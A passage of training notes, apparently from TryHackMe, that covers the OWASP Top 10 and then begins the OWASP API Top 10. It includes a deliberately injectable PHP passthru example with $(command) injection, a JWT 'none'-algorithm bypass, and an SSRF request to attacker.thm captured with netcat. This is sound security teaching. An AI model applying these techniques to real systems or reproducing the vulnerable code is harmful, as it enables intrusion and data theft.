 correctly authenticating ourselves, we get taken to a URL like this `https://bank.thm/account?id=111111`.
 On that page, we can see all our important bank details, and a user 
would do whatever they need to do and move along their way, thinking 
nothing is wrong.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0ddb5676eebdb367bff750717268b82b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0ddb5676eebdb367bff750717268b82b.png)

There is, however, a potentially huge problem here, anyone may be able to change the `id` parameter to something else like `222222`, and if the site is incorrectly configured, then he would have access to someone else's bank information.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/42a83d8c119295a79dfcab36b7e4d105.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/42a83d8c119295a79dfcab36b7e4d105.png)

The application exposes a direct object reference through the `id`
 parameter in the URL, which points to specific accounts. Since the 
application isn't checking if the logged-in user owns the referenced 
account, an attacker can get sensitive information from other users 
because of the IDOR
 vulnerability. Notice that direct object references aren't the problem,
 but rather that the application doesn't validate if the logged-in user 
should have access to the requested account.

**2. Cryptographic Failures**

# Cryptographic Failures

A **cryptographic failure**
 refers to any vulnerability arising from the misuse (or lack of use) of
 cryptographic algorithms for protecting sensitive information. Web 
applications require cryptography to provide confidentiality for their 
users at many levels.

Take, for example, a secure email application:

- When you are accessing your email account using your browser, you want to be sure that the communications between you and the server are encrypted.
That way, any eavesdropper trying to capture your network packets won't
be able to recover the content of your email addresses. When we encrypt
the network traffic between the client and server, we usually refer to
this as **encrypting data in transit**.
- Since your emails are stored in some server managed by your provider, it is also
desirable that the email provider can't read their client's emails. To
this end, your emails might also be encrypted when stored on the
servers. This is referred to as **encrypting data at rest**.

Cryptographic
 failures often end up in web apps accidentally divulging sensitive 
data. This is often data directly linked to customers (e.g. names, dates
 of birth, financial information), but it could also be more technical 
information, such as usernames and passwords.

At more complex 
levels, taking advantage of some cryptographic failures often involves 
techniques such as "Man in The Middle Attacks", whereby the attacker 
would force user connections through a device they control. Then, they 
would take advantage of weak encryption on any transmitted data to 
access the intercepted information (if the data is even encrypted in the
 first place). Of course, many examples are much simpler, and 
vulnerabilities can be found in web apps that can be exploited without 
advanced networking knowledge. Indeed, in some cases, the sensitive data
 can be found directly on the web server itself.

The most common way to store a large amount of data in a format 
easily accessible from many locations is in a database. This is perfect 
for something like a web application, as many users may interact with 
the website at any time. Database engines usually follow the Structured 
Query Language (SQL) syntax.

In a production environment, it 
is common to see databases set up on dedicated servers running a 
database service such as MySQL or MariaDB; however, databases can also 
be stored as files. These are referred to as "flat-file" databases, as 
they are stored as a single file on the computer. This is much easier 
than setting up an entire database server and could potentially be seen 
in smaller web applications. Accessing a database server is outwith the 
scope of today's task, so let's focus instead on flat-file databases.

As
 mentioned previously, flat-file databases are stored as a file on the 
disk of a computer. Usually, this would not be a problem for a web app, 
but what happens if the database is stored underneath the root directory
 of the website (i.e. one of the files accessible to the user connecting
 to the website)? Well, we can download and query it on our own machine,
 with full access to everything in the database. Sensitive Data 
Exposure, indeed!

That is a big hint for the challenge, so let's briefly cover some of the syntax we would use to query a flat-file database.

The
 most common (and simplest) format of a flat-file database is an SQLite 
database. These can be interacted with in most programming languages and
 have a dedicated client for querying them on the command line. This 
client is called `sqlite3` and is installed on many Linux distributions by default.

Let's suppose we have successfully managed to download a database:

Linux

```
user@linux$ ls -l -rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db

user@linux$ file example.db example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1
```

We can see that there is an SQLite database in the current folder.

To access it, we use `sqlite3 <database-name>`:

Linux

```
user@linux$ sqlite3 example.db                     SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite>
```

From here, we can see the tables in the database by using the `.tables` command:

Linux

```
user@linux$ sqlite3 example.db                     SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> .tables
customers
```

At this point, we can dump all the data from the table, but we won't 
necessarily know what each column means unless we look at the table 
information. First, let's use `PRAGMA table_info(customers);` to see the table information. Then we'll use `SELECT * FROM customers;` to dump the information from the table:

Linux

```
sqlite> PRAGMA table_info(customers);
0|cudtID|INT|1||1
1|custName|TEXT|1||0
2|creditCard|TEXT|0||0
3|password|TEXT|1||0

sqlite> SELECT * FROM customers;
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f
```

We can see from the table information that there are four columns: `custID`, `custName`, `creditCard` and `password`. You may notice that this matches up with the results. Take the first row:

`0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99`

We
 have the custID (0), the custName (Joy Paulson), the creditCard (4916 
9012 2231 7905) and a password hash (5f4dcc3b5aa765d61d8327deb882cf99).

**3. Injection**

# Injection

Injection
 flaws are very common in applications today. These flaws occur because 
the application interprets user-controlled input as commands or 
parameters. Injection attacks depend on what technologies are used and 
how these technologies interpret the input. Some common examples 
include:

- **SQL Injection:** This occurs when
user-controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. This could potentially allow the attacker to access, modify and delete
information in a database when this input is passed into database
queries. This would mean an attacker could steal sensitive information
such as personal details and credentials.
- **Command Injection:** This occurs when user input is passed to system commands. As a result,
an attacker can execute arbitrary system commands on application
servers, potentially allowing them to access users' systems.

The
 main defence for preventing injection attacks is ensuring that 
user-controlled input is not interpreted as queries or commands. There 
are different ways of doing this:

- **Using an allow list:** when input is sent to the server, this input is compared to a list of
safe inputs or characters. If the input is marked as safe, then it is
processed. Otherwise, it is rejected, and the application throws an
error.
- **Stripping input:** If the input contains dangerous characters, these are removed before processing.

Dangerous
 characters or input is classified as any input that can change how the 
underlying data is processed. Instead of manually constructing allow 
lists or stripping input, various libraries exist that can perform these
 actions for you.

# **Command Injection**

Command 
Injection occurs when server-side code (like PHP) in a web application 
makes a call to a function that interacts with the server's console 
directly. An injection web vulnerability allows an attacker to take 
advantage of that call to execute operating system commands arbitrarily 
on the server. The possibilities for the attacker from here are endless:
 they could list files, read their contents, run some basic commands to 
do some recon on the server or whatever they wanted, just as if they 
were sitting in front of the server and issuing commands directly into 
the command line.

Once the attacker has a foothold on the web server, they can start 
the usual enumeration of your systems and look for ways to pivot around.

# Code Example

Let's consider a scenario: MooCorp has started developing a web-based
 application for cow ASCII art with customisable text. While searching 
for ways to implement their app, they've come across the `cowsay`
 command in Linux, which does just that! Instead of coding a whole web 
application and the logic required to make cows talk in ASCII, they 
decide to write some simple code that calls the cowsay command from the 
operating system's console and sends back its contents to the website.

Let's look at the code they used for their app.  See if you can 
determine why their implementation is vulnerable to command injection.  
We'll go over it below.

```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];

        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```

In simple terms, the above snippet does the following:

1. Checking if the parameter "mooing" is set. If it is, the variable `$mooing` gets what was passed into the input field.
2. Checking if the parameter "cow" is set. If it is, the variable `$cow` gets what was passed through the parameter.
3. The program then executes the function `passthru("perl /usr/bin/cowsay -f $cow $mooing");`. The passthru function simply executes a command in the operating
system's console and sends the output back to the user's browser. You
can see that our command is formed by concatenating the $cow and $mooing variables at the end of it. Since we can manipulate those variables, we can try injecting additional commands by using simple tricks. If you
want to, you can read the docs on `passthru()` on [PHP's website](https://www.php.net/manual/en/function.passthru.php) for more information on the function itself.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8c2e8030730682f9eb1304fa1d81d47a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8c2e8030730682f9eb1304fa1d81d47a.png)

# Exploiting Command Injection

Now that we know how the application works behind the curtains, we 
will take advantage of a bash feature called "inline commands" to abuse 
the cowsay server and execute any arbitrary command we want. Bash allows
 you to run commands within commands. This is useful for many reasons, 
but in our case, it will be used to inject a command within the cowsay 
server to get it executed.

To execute inline commands, you only need to enclose them in the following format `$(your_command_here)`.
 If the console detects an inline command, it will execute it first and 
then use the result as the parameter for the outer command. Look at the 
following example, which runs `whoami` as an inline command inside an `echo` command:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b7158502a9799698ec0ab29a850c8840.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b7158502a9799698ec0ab29a850c8840.png)

So coming back to the cowsay server, here's what would happen if we send an inline command to the web application:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9f657b909062ac82af12548b4f346aec.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9f657b909062ac82af12548b4f346aec.png)

Since the application accepts any input from us, we can inject an 
inline command which will get executed and used as a parameter for 
cowsay. This will make our cow say whatever the command returns! In case
 you are not that familiar with Linux, here are some other commands you 
may want to try:

- whoami
- id
- ifconfig/ip addr
- uname -a
- ps -ef

**4. Insecure Design**

# Insecure Design

**Insecure design**
 refers to vulnerabilities which are inherent to the application's 
architecture. They are not vulnerabilities regarding bad implementations
 or configurations, but the idea behind the whole application (or a part
 of it) is flawed from the start. Most of the time, these 
vulnerabilities occur when an improper threat modelling is made during 
the planning phases of the application and propagate all the way up to 
your final app. Some other times, insecure design vulnerabilities may 
also be introduced by developers while adding some "shortcuts" around 
the code to make their testing easier. A developer could, for example, 
disable the OTP validation in the development phases to quickly test the
 rest of the app without manually inputting a code at each login but 
forget to re-enable it when sending the application to production.

# Insecure Password Resets

A good example of such vulnerabilities occurred on [Instagram a while ago](https://thezerohack.com/hack-any-instagram).
 Instagram allowed users to reset their forgotten passwords by sending 
them a 6-digit code to their mobile number via SMS for validation. If an
 attacker wanted to access a victim's account, he could try to 
brute-force the 6-digit code. As expected, this was not directly 
possible as Instagram had rate-limiting implemented so that after 250 
attempts, the user would be blocked from trying further.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7e1ca7561c839f350a086a6d739c8a57.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7e1ca7561c839f350a086a6d739c8a57.png)

However, it was found that the rate-limiting only applied to code 
attempts made from the same IP. If an attacker had several different IP 
addresses from where to send requests, he could now try
 250 codes per IP. For a 6-digit code, you have a million possible 
codes, so an attacker would need 1000000/250 = 4000 IPs to cover all 
possible codes. This may sound like an insane amount of IPs to 
have, but cloud services make it easy to get them at a relatively small 
cost, making this attack feasible.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e557475b0db7c4be710f75c24889808.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e557475b0db7c4be710f75c24889808.png)

Notice how the vulnerability is related to the idea that no user 
would be capable of using thousands of IP addresses to make concurrent 
requests to try and brute-force a numeric code. The problem is in the 
design rather than the implementation of the application in itself.

Since
 insecure design vulnerabilities are introduced at such an early stage 
in the development process, resolving them often requires rebuilding the
 vulnerable part of the application from the ground up and is usually 
harder to do than any other simple code-related vulnerability. The best 
approach to avoid such vulnerabilities is to perform threat modelling at
 the early stages of the development lifecycle

**5. Security Misconfiguration**

# Security Misconfiguration

Security Misconfigurations are distinct from the other Top 10 
vulnerabilities because they occur when security could have been 
appropriately configured but was not. Even if you download the latest 
up-to-date software, poor configurations could make your installation 
vulnerable.

Security misconfigurations include:

- Poorly configured permissions on cloud services, like S3 buckets.
- Having unnecessary features enabled, like services, pages, accounts or privileges.
- Default accounts with unchanged passwords.
- Error messages that are overly detailed and allow attackers to find out more about the system.
- Not using [HTTP security headers](https://owasp.org/www-project-secure-headers/).

This vulnerability can often lead to more vulnerabilities, such as 
default credentials giving you access to sensitive data, XML External 
Entities (XXE) or command injection on admin pages.

For more info, look at the [OWASP top 10 entry for Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/).

# Debugging Interfaces

A common security misconfiguration concerns the exposure of debugging
 features in production software. Debugging features are often available
 in programming frameworks to allow the developers to access advanced 
functionality that is useful for debugging an application while it's 
being developed. Attackers could abuse some of those debug 
functionalities if somehow, the developers forgot to disable them before
 publishing their applications.

One example of such a vulnerability was allegedly used when [Patreon got hacked in 2015](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/).
 Five days before Patreon was hacked, a security researcher reported to 
Patreon that he had found an open debug interface for a Werkzeug 
console. Werkzeug is a vital component in Python-based web applications 
as it provides an interface for web servers to execute the Python code. 
Werkzeug includes a debug console that can be accessed either via URL on
 `/console`, or it will also be presented to the user if an 
exception is raised by the application. In both cases, the console 
provides a Python console that will run any code you send to it. For an 
attacker, this means he can execute commands arbitrarily.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e95fec72ec6881026a67b94c20d6067d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e95fec72ec6881026a67b94c20d6067d.png)

**6. Vulnerable and Outdated Components**

# Vulnerable and Outdated Components

Occasionally, you may find that the company/entity you're pen-testing is using a program with a well-known vulnerability.

For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as [WPScan](https://wpscan.com/wordpress-security-scanner),
 you find that it's version 4.6. Some quick research will reveal that 
WordPress 4.6 is vulnerable to an unauthenticated remote code 
execution(RCE) exploit, and even better, you can find an exploit already
 made on [Exploit-DB](https://www.exploit-db.com/exploits/41962).

As
 you can see, this would be quite devastating because it requires very 
little work on the attacker's part. Since the vulnerability is already 
well known, someone else has likely made an exploit for the 
vulnerability already. The situation worsens when you realise that it's 
really easy for this to happen. If a company misses a single update for a
 program they use, it could be vulnerable to any number of attacks.

**7. Identification and Authentication Failures**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1cadd89ea0ec694110f3539c9592a32f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1cadd89ea0ec694110f3539c9592a32f.png)

Authentication and session management constitute core components of
 modern web applications. Authentication allows users to gain access to 
web applications by verifying their identities. The most common form of 
authentication is using a username and password mechanism. A user would 
enter these credentials, and the server would verify them. The server 
would then provide the users' browser with a session cookie if they are correct.
 A session cookie is needed because web servers use HTTP(S) to 
communicate, which is stateless. Attaching session cookies means the 
server will know who is sending what data. The server can then keep 
track of users' actions.

If an attacker
 is able to find flaws in an authentication mechanism, they might 
successfully gain access to other users' accounts. This would allow the 
attacker to access sensitive data (depending on the purpose of the 
application). Some common flaws in authentication mechanisms include the
 following:

- **Brute force attacks:** If a
web application uses usernames and passwords, an attacker can try to
launch brute force attacks that allow them to guess the username and
passwords using multiple authentication attempts.
- **Use of weak credentials:** Web applications should set strong password policies. If applications allow users to set passwords such as "password1" or common passwords, an
attacker can easily guess them and access user accounts.
- **Weak Session Cookies:** Session cookies are how the server keeps track of users. If session
cookies contain predictable values, attackers can set their own session
cookies and access users' accounts.

There can be various mitigation for broken authentication mechanisms depending on the exact flaw:

- To avoid password-guessing attacks, ensure the application enforces a strong password policy.
- To avoid brute force attacks, ensure that the application enforces an
automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute-force attacks.
- Implement
Multi-Factor Authentication. If a user has multiple authentication
methods, for example, using a username and password and receiving a code on their mobile device, it would be difficult for an attacker to get
both the password and the code to access the account.

**8. Software and Data Integrity Failures**

# What is Integrity?

When
 talking about integrity, we refer to the capacity we have to ascertain 
that a piece of data remains unmodified. Integrity is essential in 
cybersecurity as we care about maintaining important data free from 
unwanted or malicious modifications. For example, say you are 
downloading the latest installer for an application. How can you be sure
 that while downloading it, it wasn't modified in transit or somehow got
 damaged by a transmission error?

To overcome this problem, you will often see a **hash** sent
 alongside the file so that you can prove that the file you downloaded 
kept its integrity and wasn't modified in transit. A hash or digest is 
simply a number that results from applying a specific algorithm over a 
piece of data. When reading about hashing algorithms, you will often 
read about MD5, SHA1, SHA256 or many others available.

Let's take WinSCP as an example to understand better how we can use hashes to check a file's integrity. If you go to their [Sourceforge repository](https://sourceforge.net/projects/winscp/files/WinSCP/5.21.5/), you'll see that for each file available to download, there are some hashes published along:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b93dd140259193ee75ae1d12562bbd29.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b93dd140259193ee75ae1d12562bbd29.png)

These
 hashes were precalculated by the creators of WinSCP so that you can 
check the file's integrity after downloading. If we download the `WinSCP-5.21.5-Setup.exe`
 file, we can recalculate the hashes and compare them against the ones 
published in Sourceforge. To calculate the different hashes in Linux, we
 can use the following commands:

AttackBox

```
user@attackbox$ md5sum WinSCP-5.21.5-Setup.exe          20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe

user@attackbox$ sha1sum WinSCP-5.21.5-Setup.exe c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe

user@attackbox$ sha256sum WinSCP-5.21.5-Setup.exe e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe
```

Since we got the same hashes, we can safely conclude that the file we downloaded is an exact copy of the one on the website.

# Software and Data Integrity Failures

This
 vulnerability arises from code or infrastructure that uses software or 
data without using any kind of integrity checks. Since no integrity 
verification is being done, an attacker might modify the software or 
data passed to the application, resulting in unexpected consequences. 
There are mainly two types of vulnerabilities in this category:

- Software Integrity Failures
- Data Integrity Failures

# Software Integrity Failures

Suppose
 you have a website that uses third-party libraries that are stored in 
some external servers that are out of your control. While this may sound
 a bit strange, this is actually a somewhat common practice. Take as an 
example jQuery, a commonly used javascript library. If you want, you can
 include jQuery in your website directly from their servers without 
actually downloading it by including the following line in the HTML code
 of your website:

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
```

When a user navigates to your website, its browser will read its HTML
 code and download jQuery from the specified external source.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/95712e9b375e22a57613a75c6b81384d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/95712e9b375e22a57613a75c6b81384d.png)

The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of `https://code.jquery.com/jquery-3.6.1.min.js` to
 inject malicious code. As a result, anyone visiting your website would 
now pull the malicious code and execute it into their browsers 
unknowingly. This is a software integrity failure as your website makes 
no checks against the third-party library to see if it has changed. 
Modern browsers allow you to specify a hash along the library's URL so 
that the library code is executed only if the hash of the downloaded 
file matches the expected value. This security mechanism is called 
Subresource Integrity (SRI), and you can read more about it [here](https://www.srihash.org/).

The
 correct way to insert the library in your HTML code would be to use SRI
 and include an integrity hash so that if somehow an attacker is able to
 modify the library, any client navigating through your website won't 
execute the modified version. Here's how that should look in HTML:

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
```

You can go to [https://www.srihash.org/](https://www.srihash.org/) to generate hashes for any library if needed.

# Data Integrity Failures

Let's
 think of how web applications maintain sessions. Usually, when a user 
logs into an application, they will be assigned some sort of session 
token that will need to be saved on the browser for as long as the 
session lasts. This token will be repeated on each subsequent request so
 that the web application knows who we are. These session tokens can 
come in many forms but are usually assigned via cookies. **Cookies** 
are key-value pairs that a web application will store on the user's 
browser and that will be automatically repeated on each request to the 
website that issued them.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9c9ed045f84136a6e0100f4111d7f34d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9c9ed045f84136a6e0100f4111d7f34d.png)

For example, if you were creating a webmail application, you could 
assign a cookie to each user after logging in that contains their 
username. In subsequent requests, your browser would always send your 
username in the cookie so that your web application knows what user is 
connecting. This would be a terrible idea security-wise because, as we 
mentioned, cookies are stored on the user's browser, so if the user 
tampers with the cookie and changes the username, they could potentially
 impersonate someone else and read their emails! This application would 
suffer from a data integrity failure, as it trusts data that an attacker
 can tamper with.

One solution to this is to use some integrity 
mechanism to guarantee that the cookie hasn't been altered by the user. 
To avoid re-inventing the wheel, we could use some token implementations
 that allow you to do this and deal with all of the cryptography to 
provide proof of integrity without you having to bother with it. One 
such implementation is **JSON Web Tokens (JWT)**.

JWTs are very
 simple tokens that allow you to store key-value pairs on a token that 
provides integrity as part of the token. The idea is that you can 
generate tokens that you can give your users with the certainty that 
they won't be able to alter the key-value pairs and pass the integrity 
check. The structure of a JWT token is formed of 3 parts:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png)

The header contains metadata indicating this is a JWT, and the 
signing algorithm in use is HS256. The payload contains the key-value 
pairs with the data that the web application wants the client to store. 
The signature is similar to a hash, taken to verify the payload's 
integrity. If you change the payload, the web application can verify 
that the signature won't match the payload and know that you tampered 
with the JWT. Unlike a simple hash, this signature involves the use of a
 secret key held by the server only, which means that if you change the 
payload, you won't be able to generate the matching signature unless you
 know the secret key.

Notice that each of the 3 parts of the token is simply plaintext encoded with base64. You can use [this online tool](https://appdevtools.com/base64-encoder-decoder) to encode/decode base64. Try decoding the header and payload of the following token:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw`

**Note:** The signature contains binary data, so even if you decode it, you won't be able to make much sense of it anyways.

# JWT and the None Algorithm

A
 data integrity failure vulnerability was present on some libraries 
implementing JWTs a while ago. As we have seen, JWT implements a 
signature to validate the integrity of the payload data. The vulnerable 
libraries allowed attackers to bypass the signature validation by 
changing the two following things in a JWT:

1. Modify the header section of the token so that the `alg` header would contain the value `none`.
2. Remove the signature part.

Taking
 the JWT from before as an example, if we wanted to change the payload 
so that the username becomes "admin" and no signature check is done, we 
would have to decode the header and payload, modify them as needed, and 
encode them back. Notice how we removed the signature part but kept the 
dot at the end.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png)

**9. Security Logging and Monitoring Failures**

When web 
applications are set up, every action performed by the user should be 
logged. Logging is important because, in the event of an incident, the 
attackers' activities can be traced. Once their actions are traced, 
their risk and impact can be determined. Without logging, there would be
 no way to tell what actions were performed by an attacker if they gain 
access to particular web applications. The more significant impacts of 
these include:

- **Regulatory damage:** if an attacker has
gained access to personally identifiable user information and there is
no record of this, final users are affected, and the application owners
may be subject to fines or more severe actions depending on regulations.
- **Risk of further attacks:** an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.

The information stored in logs should include the following:

- HTTP status codes
- Time Stamps
- Usernames
- API endpoints/page locations
- IP addresses

These
 logs have some sensitive information, so it's important to ensure that 
they are stored securely and that multiple copies of these logs are 
stored at different locations.

As you may have noticed, logging is
 more important after a breach or incident has occurred. The ideal case 
is to have monitoring in place to detect any suspicious activity. The 
aim of detecting this suspicious activity is to either stop the attacker
 completely or reduce the impact they've made if their presence has been
 detected much later than anticipated. Common examples of suspicious 
activity include:

- Multiple unauthorised attempts for a
particular action (usually authentication attempts or access to
unauthorised resources, e.g. admin pages)
- Requests from
anomalous IP addresses or locations: while this can indicate that
someone else is trying to access a particular user's account, it can
also have a false positive rate.
- Use of automated tools:
particular automated tooling can be easily identifiable, e.g. using the
value of User-Agent headers or the speed of requests. This can indicate
that an attacker is using automated tooling.
- Common payloads: in web applications, it's common for attackers to use known payloads.
Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.

Just
 detecting suspicious activity isn't helpful. This suspicious activity 
needs to be rated according to the impact level. For example, certain 
actions will have a higher impact than others. These higher-impact 
actions need to be responded to sooner; thus, they should raise alarms 
to get the relevant parties' attention.

**10. Server-Side Request Forgery (SSRF)**

# Server-Side Request Forgery

This
 type of vulnerability occurs when an attacker can coerce a web 
application into sending requests on their behalf to arbitrary 
destinations while having control of the contents of the request itself.
 SSRF vulnerabilities often arise from implementations where our web 
application needs to use third-party services.

Think, for 
example, of a web application that uses an external API to send SMS 
notifications to its clients. For each email, the website needs to make a
 web request to the SMS provider's server to send the content of the 
message to be sent. Since the SMS provider charges per message, they 
require you to add a secret key, which they pre-assign to you, to each 
request you make to their API. The API key serves as an authentication 
token and allows the provider to know to whom to bill each message. The 
application would work like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png)

By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the `server` parameter
 to the users, which defines the server name of the SMS service 
provider. If the attacker wanted, they could simply change the value of 
the `server` to point to a machine they control, and your web
 application would happily forward the SMS request to the attacker 
instead of the SMS provider. As part of the forwarded message, the 
attacker would obtain the API key, allowing them to use the SMS service 
to send messages at your expense. To achieve this, the attacker would 
only need to make the following request to your website:

`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`

This would make the vulnerable web application make a request to:

`https://attacker.thm/api/send?msg=ABC`

You could then just capture the contents of the request using Netcat:

AttackBox

```
user@attackbox$ nc -lvp 80Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
```

This is a really basic case of SSRF. If 
this doesn't look that scary, SSRF can actually be used to do much more.
 In general, depending on the specifics of each scenario, SSRF can be 
used for:

- Enumerate internal networks, including IP addresses and ports.
- Abuse trust relationships between servers and gain access to otherwise restricted services.
- Interact with some non-HTTP services to get remote code execution (RCE).

## **OWASP API TOP 10**

# **What is an API & Why is it important?**

API
 stands for Application Programming Interface. It is a middleware that 
facilitates the communication of two software components utilising a set
 of protocols and definitions. In the API context, the term '**application**' refers to any software having specific functionality, and '**interface**'
 refers to the service contract between two apps that make communication
 possible via requests and responses. The API documentation contains all
 the information on how developers have structured those responses and 
requests. The significance of APIs to app development is in just a single sentence, i.e., **API is a building block for developing complex and enterprise-level applications**.

# Recent Data Breaches through APIs

- LinkedIn data breach: In June 2021, the data of over 700 million LinkedIn users
were offered for sale on one of the dark web forums, which was scraped
by exploiting the LinkedIn API. The hacker published a sample of 1
million records to confirm the legitimacy of the LinkedIn breach,
containing full names of the users, email addresses, phone numbers,
geolocation records, LinkedIn profile links, work experience
information, and other social media account details.
- Twitter data breach: In June 2022, data of more than 5.4 Million [Twitter](https://privacy.twitter.com/en/blog/2022/an-issue-affecting-some-anonymous-accounts) users was released for sale on the dark web. Hackers conducted the breach by
exploiting a zero-day in the Twitter API that showed Twitter's handle
against a mobile number or email.
- PIXLR data breach: In January
2021, PIXLR, an online photo editor app, suffered a data breach that
impacted around 1.9 million users. All the data by the hackers was
dumped on a dark web forum, which included usernames, email addresses,
countries, and hashed passwords.

Now that we understand the
 threat and the damage caused due to non-adherence to mitigation 
measures - let's discuss developing a secure API through **OWASP API Security Top 10 principles**.

**Vulnerability I - Broken Object Level Authorisation (BOLA)**

# How does it Happen?

Generally,
 API endpoints are utilised for a common practice of retrieving and 
manipulating data through object identifiers. BOLA refers to Insecure 
Direct Object Reference (IDOR) - which creates a scenario where the user
 uses the **input functionality and gets access to the resources they are not authorised to access**. In
 an API, such controls are usually implemented through programming in 
Models (Model-View-Controller Architecture) at the code level.

# Likely Impact

The absence of controls to prevent **unauthorised object access can lead to data leakage**
 and, in some cases, complete account takeover. User's or subscribers' 
data in the database plays a critical role in an organisation's brand 
reputation; if such data is leaked over the internet, that may result in
 substantial financial loss.

# Practical Example

- Open the VM. You will find that the Chrome browser and Talend API Tester
application are running automatically, which we will be using for
debugging the API endpoints.
- Bob is working as an API developer in `Company MHT` and developed an endpoint `/apirule1/users/{ID}` that will allow other applications or developers to request information by
sending an employee ID. In the VM, you can request results by sending `GET` requests to `http://localhost:80/MHT/apirule1_v/user/1.`

